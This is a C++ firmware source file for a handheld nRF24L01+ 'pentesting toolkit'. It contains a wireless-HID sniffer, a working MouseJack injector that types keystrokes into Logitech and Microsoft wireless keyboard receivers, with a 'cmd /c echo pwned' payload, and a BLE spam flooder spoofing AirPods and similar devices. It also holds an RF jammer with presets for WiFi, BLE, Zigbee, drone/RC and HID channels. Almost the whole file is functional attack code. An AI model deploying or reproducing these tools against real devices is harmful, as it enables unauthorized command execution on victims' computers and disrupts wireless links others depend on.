/*
 * nrf24_suite.cpp — comprehensive nRF24L01+ pentesting toolkit.
 *
 * Features:
 *   - Promiscuous sniffer (Travis Goodspeed SETUP_AW=0 trick)
 *   - MouseJack: device fingerprint + Logitech/MS HID injection
 *   - BLE spam: ADV_IND via nRF24 with CRC24 + whitening
 *   - Expanded jammer: CW carrier + data flood, 10 presets
 *   - 2.4 GHz scanner with protocol identification
 *   - ESB packet replay
 */
#include "../app.h"
#include "../theme.h"
#include "../ui.h"
#include "../input.h"
#include "../radio.h"
#include "../nrf24_hw.h"
#include <RF24.h>

/* ---- Low-level register access ---- */

/* Direct SPI register write — RF24 lib marks write_register private
 * in newer versions. Use raw SPI transfer. */
static void nrf_write_reg(uint8_t reg, uint8_t val)
{
    auto &r = nrf24_radio();
    /* beginTransaction + manual CS toggle to write register. */
    SPI.beginTransaction(SPISettings(10000000, MSBFIRST, SPI_MODE0));
    digitalWrite(NRF24_CS, LOW);
    SPI.transfer(0x20 | (reg & 0x1F));  /* W_REGISTER command */
    SPI.transfer(val);
    digitalWrite(NRF24_CS, HIGH);
    SPI.endTransaction();
}

/* ---- BLE helpers ---- */

static uint8_t ble_reverse_bits(uint8_t b)
{
    uint8_t r = 0;
    for (int i = 0; i < 8; i++) { r = (r << 1) | (b & 1); b >>= 1; }
    return r;
}

static void ble_crc24(const uint8_t *data, uint8_t len, uint8_t *crc)
{
    crc[0] = 0x55; crc[1] = 0x55; crc[2] = 0x55;
    while (len--) {
        uint8_t d = *data++;
        for (int i = 0; i < 8; i++, d >>= 1) {
            uint8_t t = crc[0] >> 7;
            crc[0] = (crc[0] << 1) | (crc[1] >> 7);
            crc[1] = (crc[1] << 1) | (crc[2] >> 7);
            crc[2] <<= 1;
            if (t != (d & 1)) { crc[2] ^= 0x5B; crc[1] ^= 0x06; }
        }
    }
}

static void ble_whiten(uint8_t *data, uint8_t len, uint8_t ble_ch)
{
    uint8_t coeff = ble_reverse_bits(ble_ch) | 2;
    while (len--) {
        uint8_t m = 1;
        for (int i = 0; i < 8; i++, m <<= 1) {
            if (coeff & 0x80) { coeff ^= 0x11; *data ^= m; }
            coeff <<= 1;
        }
        data++;
    }
}

static void ble_encode_packet(uint8_t *pkt, uint8_t len, uint8_t ble_ch)
{
    ble_crc24(pkt, len - 3, pkt + len - 3);
    for (int i = 0; i < 3; i++) pkt[len - 3 + i] = ble_reverse_bits(pkt[len - 3 + i]);
    ble_whiten(pkt, len, ble_ch);
    for (int i = 0; i < len; i++) pkt[i] = ble_reverse_bits(pkt[i]);
}

/* BLE advertising channels: nRF ch → BLE logical ch */
static const uint8_t BLE_NRF_CH[]  = {2, 26, 80};
static const uint8_t BLE_LOG_CH[]  = {37, 38, 39};

/* BLE access address 0x8E89BED6 reversed for nRF24 */
static const uint8_t BLE_ACCESS[] = {0x71, 0x91, 0x7D, 0x6B};

/* ---- CRC16-CCITT for ESB sniffer ---- */

static uint16_t crc_update(uint16_t crc, uint8_t byte, uint8_t bits)
{
    crc ^= ((uint16_t)byte << 8);
    while (bits--) crc = (crc & 0x8000) ? (crc << 1) ^ 0x1021 : crc << 1;
    return crc & 0xFFFF;
}

/* ---- Logitech checksum ---- */

static void log_checksum(uint8_t *p, uint8_t sz)
{
    uint8_t c = 0xFF;
    for (int i = 0; i < sz - 1; i++) c -= p[i];
    p[sz - 1] = c + 1;
}

/* ---- HID keycode table ---- */

static uint8_t ascii_to_hid(char c, uint8_t *mod)
{
    *mod = 0;
    if (c >= 'a' && c <= 'z') return 0x04 + (c - 'a');
    if (c >= 'A' && c <= 'Z') { *mod = 0x02; return 0x04 + (c - 'A'); }
    if (c >= '1' && c <= '9') return 0x1E + (c - '1');
    if (c == '0') return 0x27;
    if (c == ' ') return 0x2C;
    if (c == '\n') return 0x28;
    if (c == '\t') return 0x2B;
    if (c == '-') return 0x2D;
    if (c == '=') return 0x2E;
    if (c == '.') return 0x37;
    if (c == '/') return 0x38;
    if (c == '!') { *mod = 0x02; return 0x1E; }
    if (c == '@') { *mod = 0x02; return 0x1F; }
    return 0;
}

/* ==== FEATURE: Promiscuous Sniffer ==== */

#define SNIFF_MAX_DEVICES 16

struct sniff_dev_t {
    uint8_t  addr[5];
    uint8_t  channel;
    uint16_t count;
    char     type[12];
};

static sniff_dev_t s_devs[SNIFF_MAX_DEVICES];
static int s_dev_count = 0;

static void fingerprint(const uint8_t *payload, uint8_t len, char *type)
{
    if (len == 19 && payload[0] == 0x08 && payload[6] == 0x40)
        strcpy(type, "MS Mouse");
    else if (len == 19 && payload[0] == 0x0A)
        strcpy(type, "MS Enc");
    else if (payload[0] == 0x00 && len == 10 && (payload[1] == 0xC2 || payload[1] == 0x4F))
        strcpy(type, "Logi Mouse");
    else if (payload[0] == 0x00 && len == 22 && payload[1] == 0xD3)
        strcpy(type, "Logi KB");
    else if (payload[0] == 0x00 && len == 5 && payload[1] == 0x40)
        strcpy(type, "Logi KA");
    else
        strcpy(type, "Unknown");
}

void feat_nrf24_sniffer(void)
{
    radio_switch(RADIO_NRF24);
    if (!nrf24_begin()) {
        ui_toast("nRF24 not found", T_BAD, 1500);
        radio_switch(RADIO_NONE);
        return;
    }

    auto &rf = nrf24_radio();
    rf.setAutoAck(false);
    rf.setPayloadSize(32);
    rf.setDataRate(RF24_2MBPS);
    rf.setCRCLength(RF24_CRC_DISABLED);
    nrf_write_reg(0x02, 0x00);   /* EN_RXADDR: disable all pipes */
    nrf_write_reg(0x03, 0x00);   /* SETUP_AW: 0 = promiscuous trick */
    uint8_t promisc_addr[] = {0xAA};
    rf.openReadingPipe(0, promisc_addr);
    rf.startListening();

    s_dev_count = 0;
    auto &d = M5Cardputer.Display;
    uint8_t ch = 2;
    uint32_t packets = 0, valid = 0;
    uint32_t last_draw = 0, last_hop = 0;

    ui_clear_body();

    while (true) {
        uint32_t now = millis();
        if (now - last_hop > 8) {
            ch = 2 + (esp_random() % 82);
            rf.setChannel(ch);
            last_hop = now;
        }

        if (rf.available()) {
            uint8_t buf[32];
            rf.read(buf, 32);
            packets++;

            /* Try to validate ESB packet with CRC16-CCITT. */
            for (int offset = 0; offset < 2; offset++) {
                if (offset == 1) {
                    for (int x = 31; x >= 0; x--)
                        buf[x] = (x > 0) ? (buf[x-1] << 7 | buf[x] >> 1) : (buf[x] >> 1);
                }
                uint8_t plen = buf[5] >> 2;
                if (plen > 23) continue;

                uint16_t crc_given = (buf[6+plen] << 9) | (buf[7+plen] << 1);
                crc_given = (crc_given << 8) | (crc_given >> 8);
                if (buf[8+plen] & 0x80) crc_given |= 0x100;

                uint16_t crc = 0xFFFF;
                for (int x = 0; x < 6 + plen; x++) crc = crc_update(crc, buf[x], 8);
                crc = crc_update(crc, buf[6+plen] & 0x80, 1);
                crc = (crc << 8) | (crc >> 8);

                if (crc == crc_given && plen > 0) {
                    valid++;
                    /* Extract address. */
                    uint8_t addr[5];
                    memcpy(addr, buf, 5);
                    /* Extract payload (re-align bits). */
                    uint8_t payload[32];
                    for (int x = 0; x < plen + 3; x++)
                        payload[x] = (buf[6+x] << 1) | (buf[7+x] >> 7);

                    /* Find or add device. */
                    int idx = -1;
                    for (int i = 0; i < s_dev_count; i++)
                        if (memcmp(s_devs[i].addr, addr, 5) == 0) { idx = i; break; }
                    if (idx < 0 && s_dev_count < SNIFF_MAX_DEVICES) {
                        idx = s_dev_count++;
                        memcpy(s_devs[idx].addr, addr, 5);
                        s_devs[idx].channel = ch;
                        fingerprint(payload, plen, s_devs[idx].type);
                        s_devs[idx].count = 0;
                    }
                    if (idx >= 0) s_devs[idx].count++;
                    break;
                }
            }
        }

        if (now - last_draw > 300) {
            last_draw = now;
            if (packets == 0) ui_clear_body();
            ui_draw_status(radio_name(), "sniffer");
            ui_text(4, BODY_Y + 2, T_ACCENT, "ESB SNIFFER  ch%u  pkt%lu/%lu",
                    ch, (unsigned long)valid, (unsigned long)packets);
            d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT);

            for (int i = 0; i < s_dev_count && i < 6; i++) {
                int y = BODY_Y + 16 + i * 14;
                d.setTextColor(T_FG, T_BG);
                d.setCursor(4, y);
                d.printf("%02X%02X%02X ch%u %s (%u)",
                         s_devs[i].addr[0], s_devs[i].addr[1], s_devs[i].addr[2],
                         s_devs[i].channel, s_devs[i].type, s_devs[i].count);
            }
            if (s_dev_count == 0)
                ui_text(4, BODY_Y + 30, T_DIM, "scanning for wireless HID...");

            ui_draw_footer("ESC=back");
        }

        uint16_t k = input_poll();
        if (k == PK_ESC) break;
    }

    nrf24_end();
    radio_switch(RADIO_NONE);
}

/* ==== FEATURE: MouseJack HID Injection ==== */

void feat_nrf24_mousejack(void)
{
    if (s_dev_count == 0) {
        ui_toast("run sniffer first", T_WARN, 1500);
        return;
    }

    radio_switch(RADIO_NRF24);
    if (!nrf24_begin()) {
        ui_toast("nRF24 not found", T_BAD, 1500);
        radio_switch(RADIO_NONE);
        return;
    }

    auto &d = M5Cardputer.Display;
    auto &rf = nrf24_radio();
    int sel = 0;
    bool injecting = false;

    /* Device picker. */
    while (!injecting) {
        ui_clear_body();
        d.setTextColor(T_BAD, T_BG);
        d.setCursor(4, BODY_Y + 2); d.print("MOUSEJACK — pick target");
        d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_BAD);
        for (int i = 0; i < s_dev_count && i < 6; i++) {
            int y = BODY_Y + 18 + i * 13;
            bool s = (i == sel);
            if (s) d.fillRoundRect(2, y - 1, SCR_W - 4, 12, 2, T_SEL_BG);
            d.setTextColor(s ? T_ACCENT : T_FG, s ? T_SEL_BG : T_BG);
            d.setCursor(6, y);
            d.printf("%02X%02X%02X%02X%02X ch%u %s",
                     s_devs[i].addr[0], s_devs[i].addr[1], s_devs[i].addr[2],
                     s_devs[i].addr[3], s_devs[i].addr[4],
                     s_devs[i].channel, s_devs[i].type);
        }
        ui_draw_footer(";/.=sel  ENTER=inject  ESC=back");
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) { nrf24_end(); radio_switch(RADIO_NONE); return; }
        if (k == ';' || k == PK_UP) sel = (sel - 1 + s_dev_count) % s_dev_count;
        if (k == '.' || k == PK_DOWN) sel = (sel + 1) % s_dev_count;
        if (k == PK_ENTER) injecting = true;
    }

    /* Configure for injection to selected device. */
    sniff_dev_t &tgt = s_devs[sel];
    uint64_t addr64 = 0;
    for (int i = 0; i < 5; i++) { addr64 <<= 8; addr64 |= tgt.addr[i]; }

    rf.stopListening();
    rf.setAutoAck(true);
    rf.setPALevel(RF24_PA_MAX);
    rf.setDataRate(RF24_2MBPS);
    rf.enableDynamicPayloads();
    nrf_write_reg(0x03, 0x03);  /* SETUP_AW: 5-byte addresses */
    rf.setRetries(5, 15);
    rf.setChannel(tgt.channel);
    rf.openWritingPipe(addr64);

    bool is_logi = (strncmp(tgt.type, "Logi", 4) == 0);

    /* Injection payload builder. Type text to inject as keystrokes. */
    char inject_buf[64] = "Hello from POSEIDON";
    int inject_len = strlen(inject_buf);
    uint32_t injected = 0;

    while (true) {
        ui_clear_body();
        ui_draw_status(radio_name(), "inject");
        d.setTextColor(T_BAD, T_BG);
        d.setCursor(4, BODY_Y + 2);
        d.printf("INJECT → %s", tgt.type);
        d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_BAD);
        d.setTextColor(T_FG, T_BG);
        d.setCursor(4, BODY_Y + 20);
        d.printf("addr: %02X%02X%02X%02X%02X ch%u",
                 tgt.addr[0], tgt.addr[1], tgt.addr[2],
                 tgt.addr[3], tgt.addr[4], tgt.channel);
        d.setCursor(4, BODY_Y + 34);
        d.printf("payload: %s", inject_buf);
        d.setTextColor(T_GOOD, T_BG);
        d.setCursor(4, BODY_Y + 50);
        d.printf("injected: %lu", (unsigned long)injected);
        ui_draw_footer("ENTER=inject  T=type  ESC=back");

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
        if (k == 't' || k == 'T') {
            /* TODO: input_line for custom text */
            strcpy(inject_buf, "cmd /c echo pwned");
            inject_len = strlen(inject_buf);
        }
        if (k == PK_ENTER) {
            /* Inject the string as HID keystrokes. */
            for (int i = 0; i < inject_len; i++) {
                uint8_t mod = 0;
                uint8_t hid = ascii_to_hid(inject_buf[i], &mod);
                if (hid == 0) continue;

                if (is_logi) {
                    uint8_t p[10] = {0};
                    p[1] = 0xC1; p[2] = mod; p[3] = hid;
                    log_checksum(p, 10);
                    rf.write(p, 10);
                    delay(5);
                    memset(p, 0, 10); p[1] = 0xC1;
                    log_checksum(p, 10);
                    rf.write(p, 10);
                    delay(5);
                    /* Keep-alive every 10 chars. */
                    if (i % 10 == 9) {
                        uint8_t ka[] = {0x00, 0x40, 0x00, 0x5A, 0x66};
                        rf.write(ka, 5);
                    }
                } else {
                    /* Microsoft-style (simplified). */
                    uint8_t p[19] = {0};
                    p[0] = 0x08; p[6] = 0x43; p[7] = mod; p[9] = hid;
                    p[18] = 0; for (int j = 0; j < 18; j++) p[18] ^= p[j]; p[18] = ~p[18];
                    rf.write(p, 19);
                    delay(5);
                    memset(p + 4, 0, 15);
                    p[6] = 0x43;
                    p[18] = 0; for (int j = 0; j < 18; j++) p[18] ^= p[j]; p[18] = ~p[18];
                    rf.write(p, 19);
                    delay(5);
                }
            }
            injected++;
        }
    }

    nrf24_end();
    radio_switch(RADIO_NONE);
}

/* ==== FEATURE: BLE Spam ==== */

void feat_nrf24_ble_spam(void)
{
    radio_switch(RADIO_NRF24);
    if (!nrf24_begin()) {
        ui_toast("nRF24 not found", T_BAD, 1500);
        radio_switch(RADIO_NONE);
        return;
    }

    auto &rf = nrf24_radio();
    rf.disableCRC();
    rf.setAutoAck(false);
    rf.stopListening();
    rf.setAddressWidth(4);
    rf.setRetries(0, 0);
    rf.setDataRate(RF24_1MBPS);
    rf.setPALevel(RF24_PA_MAX);
    rf.openWritingPipe(BLE_ACCESS);

    auto &d = M5Cardputer.Display;
    uint32_t adv_count = 0;
    bool active = false;
    const char *names[] = {"AirPods Pro", "Galaxy Buds", "Free WiFi", "TV Remote", "Pixel Watch"};
    int name_idx = 0;

    while (true) {
        if (active) {
            /* Build BLE ADV_IND packet. */
            uint8_t pkt[32];
            int pos = 0;
            pkt[pos++] = 0x42;  /* PDU type: ADV_NONCONN_IND */
            /* Random MAC. */
            uint8_t mac[6];
            for (int i = 0; i < 6; i++) mac[i] = esp_random() & 0xFF;
            mac[0] |= 0xC0;  /* random address type */
            int len_pos = pos++;  /* length filled later */
            for (int i = 0; i < 6; i++) pkt[pos++] = mac[i];
            /* Flags AD. */
            pkt[pos++] = 2; pkt[pos++] = 0x01; pkt[pos++] = 0x06;
            /* Name AD. */
            const char *nm = names[name_idx];
            int nlen = strlen(nm);
            if (nlen > 12) nlen = 12;
            pkt[pos++] = nlen + 1; pkt[pos++] = 0x09;
            memcpy(pkt + pos, nm, nlen); pos += nlen;
            /* CRC placeholder. */
            pkt[pos++] = 0x55; pkt[pos++] = 0x55; pkt[pos++] = 0x55;
            pkt[len_pos] = pos - 2 - 3;  /* PDU length excl header + CRC */

            /* TX on all 3 adv channels. */
            for (int ch = 0; ch < 3; ch++) {
                rf.setChannel(BLE_NRF_CH[ch]);
                uint8_t tmp[32]; memcpy(tmp, pkt, pos);
                ble_encode_packet(tmp, pos, BLE_LOG_CH[ch]);
                rf.write(tmp, pos);
                delayMicroseconds(300);
            }
            adv_count++;
            name_idx = (name_idx + 1) % 5;
        }

        static uint32_t last_draw = 0;
        uint32_t now = millis();
        if (now - last_draw > 200) {
            last_draw = now;
            if (!active || adv_count < 2) ui_clear_body();
            ui_draw_status(radio_name(), "BLE spam");
            ui_text(4, BODY_Y + 2, T_ACCENT2, "BLE SPAM %s", active ? "ACTIVE" : "");
            d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT2);
            ui_text(4, BODY_Y + 20, T_FG, "advertisements: %lu", (unsigned long)adv_count);
            ui_text(4, BODY_Y + 34, T_DIM, "spoofs: AirPods, Galaxy Buds, etc");
            ui_text(4, BODY_Y + 48, active ? T_BAD : T_DIM,
                    active ? "flooding all 3 BLE adv channels" : "press ENTER to start");
            ui_draw_footer(active ? "ESC=stop" : "ENTER=start  ESC=back");
        }

        uint16_t k = input_poll();
        if (k == PK_ESC) {
            if (active) active = false;
            else break;
        }
        if (k == PK_ENTER && !active) { active = true; adv_count = 0; }
    }

    nrf24_end();
    radio_switch(RADIO_NONE);
}

/* ==== FEATURE: 2.4 GHz Scanner ==== */

void feat_nrf24_scanner(void)
{
    radio_switch(RADIO_NRF24);
    if (!nrf24_begin()) {
        ui_toast("nRF24 not found", T_BAD, 1500);
        radio_switch(RADIO_NONE);
        return;
    }

    auto &rf = nrf24_radio();
    rf.setAutoAck(false);
    rf.setDataRate(RF24_2MBPS);

    uint8_t hits[126] = {0};
    uint8_t peak[126] = {0};
    auto &d = M5Cardputer.Display;
    int mode = 0;  /* 0=bars, 1=labels */

    const int GX = 4, GY = BODY_Y + 14, GW = SCR_W - 8, GH = BODY_H - 28;
    float scale = (float)GW / 126;

    ui_clear_body();

    while (true) {
        /* Sweep all 126 channels. */
        for (int ch = 0; ch < 126; ch++) {
            rf.setChannel(ch);
            rf.startListening();
            delayMicroseconds(170);
            rf.stopListening();
            if (rf.testRPD()) {
                if (hits[ch] < 200) hits[ch] += 8;
            } else {
                if (hits[ch] > 0) hits[ch]--;
            }
            if (hits[ch] > peak[ch]) peak[ch] = hits[ch];
        }
        /* Decay peaks. */
        static uint32_t decay_t = 0;
        if (millis() - decay_t > 500) {
            decay_t = millis();
            for (int i = 0; i < 126; i++) if (peak[i] > 0) peak[i]--;
        }

        /* Draw. */
        d.fillRect(GX, GY, GW, GH, T_BG);
        d.drawRect(GX - 1, GY - 1, GW + 2, GH + 2, T_DIM);

        for (int ch = 0; ch < 126; ch++) {
            int x = GX + (int)(ch * scale);
            int bw = (int)(scale); if (bw < 1) bw = 1;
            int h = (hits[ch] * GH) / 200;
            if (h > 0) {
                uint16_t c;
                if (hits[ch] < 50) c = d.color565(0, hits[ch] * 5, 0);
                else if (hits[ch] < 120) c = d.color565((hits[ch]-50)*3, 255, 0);
                else c = d.color565(255, 255 - (hits[ch]-120)*3, 0);
                d.fillRect(x, GY + GH - h, bw, h, c);
            }
            int ph = (peak[ch] * GH) / 200;
            if (ph > 1) d.drawPixel(x, GY + GH - ph, T_FG);
        }

        ui_text(4, BODY_Y + 2, T_ACCENT, "2.4GHz SCAN");

        if (mode == 1) {
            /* Protocol markers. */
            d.setTextColor(T_GOOD, T_BG);
            int wch[] = {12, 37, 62}; const char *wl[] = {"W1","W6","W11"};
            for (int i = 0; i < 3; i++) {
                d.setCursor(GX + (int)(wch[i]*scale) - 4, GY + GH + 3); d.print(wl[i]);
            }
            d.setTextColor(T_ACCENT2, T_BG);
            int bch[] = {2, 26, 80};
            for (int i = 0; i < 3; i++) {
                d.setCursor(GX + (int)(bch[i]*scale), GY + GH + 10); d.print("B");
            }
        } else {
            d.setTextColor(T_DIM, T_BG);
            d.setCursor(GX, GY + GH + 3); d.print("2400");
            d.setCursor(GX + GW - 24, GY + GH + 3); d.print("2525");
        }

        ui_draw_footer("L=labels R=reset ESC=back");

        uint16_t k = input_poll();
        if (k == PK_ESC) break;
        if (k == 'l' || k == 'L') mode = 1 - mode;
        if (k == 'r' || k == 'R') { memset(hits, 0, 126); memset(peak, 0, 126); }
    }

    nrf24_end();
    radio_switch(RADIO_NONE);
}

/* ==== FEATURE: Expanded Jammer ==== */

struct jam_preset_t { const char *name; const uint8_t *chs; uint8_t count; };

static const uint8_t CH_BLE[] = {2, 26, 80};
static const uint8_t CH_WIFI1[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22};
static const uint8_t CH_WIFI6[] = {30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51};
static const uint8_t CH_WIFI11[] = {55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76};
static const uint8_t CH_ZIGBEE[] = {5,10,15,20,25,30,35,40,45,50,55,60,65,70,75,80};
static const uint8_t CH_DRONE[] = {1,3,5,7,11,15,20,25,30,35,40,45,50,55,60,65,70,75,80,85,90,95,100};
static const uint8_t CH_HID[] = {5,15,25,35,45,55,65,74};

static const jam_preset_t PRESETS[] = {
    {"BLE Advertising", CH_BLE, 3},
    {"WiFi ch 1",       CH_WIFI1, 22},
    {"WiFi ch 6",       CH_WIFI6, 22},
    {"WiFi ch 11",      CH_WIFI11, 22},
    {"Zigbee",          CH_ZIGBEE, 16},
    {"Drone/RC",        CH_DRONE, 23},
    {"Wireless HID",    CH_HID, 8},
};
#define JAM_PRESET_COUNT 7
#define JAM_MAX_MS 20000

void feat_nrf24_jammer(void)
{
    radio_switch(RADIO_NRF24);
    if (!nrf24_begin()) {
        ui_toast("nRF24 not found", T_BAD, 1500);
        radio_switch(RADIO_NONE);
        return;
    }

    auto &rf = nrf24_radio();
    auto &d = M5Cardputer.Display;
    int sel = 0;
    bool active = false;
    uint32_t jam_start = 0;
    int jam_mode = 0; /* 0=CW carrier, 1=data flood */

    uint8_t noise[32];
    for (int i = 0; i < 32; i++) noise[i] = esp_random();

    while (true) {
        uint32_t now = millis();
        if (active && now - jam_start > JAM_MAX_MS) {
            active = false;
            rf.stopConstCarrier();
            rf.powerDown();
            ui_toast("20s limit", T_WARN, 800);
            nrf24_begin();
        }

        if (active) {
            const jam_preset_t &p = PRESETS[sel];
            if (jam_mode == 0) {
                /* CW carrier hop. */
                for (int i = 0; i < p.count; i++) {
                    rf.setChannel(p.chs[i]);
                    delayMicroseconds(esp_random() % 60 + 20);
                }
            } else {
                /* Data flood. */
                rf.stopListening();
                for (int i = 0; i < p.count; i++) {
                    rf.setChannel(p.chs[i]);
                    rf.writeFast(noise, 32);
                    noise[i % 32] ^= esp_random();
                }
            }
        }

        if (!active || millis() % 250 < 10) {
            if (!active) ui_clear_body();
            ui_draw_status(radio_name(), "jammer");
            ui_text(4, BODY_Y + 2, active ? T_BAD : T_ACCENT2,
                    "nRF24 JAMMER %s", active ? "ACTIVE" : "");
            d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, active ? T_BAD : T_ACCENT2);

            if (!active) {
                for (int i = 0; i < JAM_PRESET_COUNT; i++) {
                    int y = BODY_Y + 16 + i * 12;
                    bool s = (i == sel);
                    if (s) d.fillRoundRect(2, y - 1, SCR_W - 4, 11, 2, T_SEL_BG);
                    d.setTextColor(s ? T_ACCENT : T_FG, s ? T_SEL_BG : T_BG);
                    d.setCursor(6, y);
                    d.printf("%s (%uch)", PRESETS[i].name, PRESETS[i].count);
                }
                ui_text(4, BODY_Y + 102, T_DIM, "mode: %s  (M=toggle)",
                        jam_mode == 0 ? "CW carrier" : "data flood");
                ui_draw_footer(";/.=sel M=mode ENTER=start ESC=quit");
            } else {
                uint32_t el = (now - jam_start) / 1000;
                ui_text(4, BODY_Y + 20, T_FG, "%s", PRESETS[sel].name);
                ui_text(4, BODY_Y + 34, T_FG, "mode: %s", jam_mode == 0 ? "CW" : "flood");
                ui_text(4, BODY_Y + 50, T_BAD, "TX %lus / 20s", (unsigned long)el);
                for (int i = 0; i < 10; i++) {
                    int h = (esp_random() % 25) + 3;
                    d.fillRect(8 + i * 23, BODY_Y + 68, 18, h, T_BAD);
                }
                ui_draw_footer("ESC=STOP");
            }
        }

        uint16_t k = input_poll();
        if (k == PK_ESC) {
            if (active) { active = false; rf.stopConstCarrier(); nrf24_begin(); }
            else break;
        }
        if (!active) {
            if (k == ';' || k == PK_UP) sel = (sel - 1 + JAM_PRESET_COUNT) % JAM_PRESET_COUNT;
            if (k == '.' || k == PK_DOWN) sel = (sel + 1) % JAM_PRESET_COUNT;
            if (k == 'm' || k == 'M') jam_mode = 1 - jam_mode;
            if (k == PK_ENTER) {
                active = true;
                jam_start = millis();
                rf.setAutoAck(false);
                rf.setPALevel(RF24_PA_MAX);
                rf.setDataRate(RF24_2MBPS);
                rf.setCRCLength(RF24_CRC_DISABLED);
                if (jam_mode == 0) rf.startConstCarrier(RF24_PA_MAX, PRESETS[sel].chs[0]);
                else rf.stopListening();
            }
        }
        delay(active ? 0 : 20);
    }

    nrf24_end();
    radio_switch(RADIO_NONE);
}
